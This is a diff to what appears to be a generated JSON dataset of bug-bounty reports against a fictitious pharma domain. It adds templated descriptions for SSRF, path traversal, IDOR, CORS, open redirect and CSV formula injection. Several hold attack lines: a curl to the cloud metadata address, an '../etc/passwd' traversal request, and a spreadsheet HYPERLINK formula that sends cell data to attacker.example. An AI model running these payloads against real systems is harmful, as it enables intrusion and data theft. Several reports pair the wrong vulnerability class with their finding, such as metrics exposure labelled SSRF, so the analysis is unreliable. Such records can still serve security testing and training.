+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.edelquarz-pharma.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2724,7 +2744,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2872,7 +2893,8 @@
           "offset": "1d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.edelquarz-pharma.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3010,7 +3032,8 @@
           "offset": "2d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.edelquarz-pharma.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3121,7 +3144,8 @@
           "offset": "1d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.edelquarz-pharma.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3268,7 +3292,8 @@
           "offset": "8d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3341,7 +3366,8 @@
           "offset": "20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3459,7 +3485,8 @@
           "offset": "7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3606,7 +3633,8 @@
           "offset": "5d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.edelquarz-pharma.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3760,7 +3788,8 @@
           "offset": "5d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3847,7 +3876,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.edelquarz-pharma.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3982,7 +4012,8 @@
           "offset": "7d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/profile`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4055,7 +4086,8 @@
           "offset": "2d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4179,7 +4211,8 @@
           "offset": "1d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.edelquarz-pharma.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4344,7 +4377,8 @@
           "offset": "9d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.edelquarz-pharma.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4459,7 +4493,8 @@
           "offset": "3d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.edelquarz-pharma.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4591,7 +4626,8 @@
           "offset": "1d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.edelquarz-pharma.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4718,7 +4754,8 @@
           "offset": "4d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.edelquarz-pharma.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4845,7 +4882,8 @@
           "offset": "3d 20h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.edelquarz-pharma.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4997,7 +5035,8 @@
           "offset": "8d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.edelquarz-pharma.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5084,7 +5123,8 @@
           "offset": "1d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/profile`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5268,7 +5308,8 @@
           "offset": "9d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5396,7 +5437,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.edelquarz-pharma.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5547,7 +5589,8 @@
           "offset": "6d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.edelquarz-pharma.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5639,7 +5682,8 @@
           "offset": "1d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.edelquarz-pharma.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5762,7 +5806,8 @@
           "offset": "6d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5914,7 +5959,8 @@
           "offset": "7d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.edelquarz-pharma.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6074,7 +6120,8 @@
           "offset": "4d 10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.edelquarz-pharma.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6204,7 +6251,8 @@
           "offset": "5d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.edelquarz-pharma.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6311,7 +6359,8 @@
           "offset": "5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.edelquarz-pharma.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6474,7 +6523,8 @@
           "offset": "7d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.edelquarz-pharma.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6584,7 +6634,8 @@
           "offset": "3d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
